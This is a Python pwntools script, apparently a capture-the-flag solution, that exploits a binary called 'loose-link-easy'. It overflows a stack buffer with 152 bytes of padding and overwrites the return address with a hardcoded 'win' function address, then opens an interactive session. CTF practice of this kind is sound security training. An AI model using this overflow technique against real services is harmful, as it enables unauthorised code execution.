#!/usr/bin/env python3

from pwn import *

exe = ELF("./loose-link-easy")

context.binary = exe

gdb_script = '''
b *main
c
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gdb_script)
    else:
        r = remote("addr", 1337)

    return r

win_addr = 0x401fca
offset = 152
def main():
    r = conn()

    # good luck pwning :)
    payload = flat(
        b"A" *offset,
        win_addr
    )
    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()
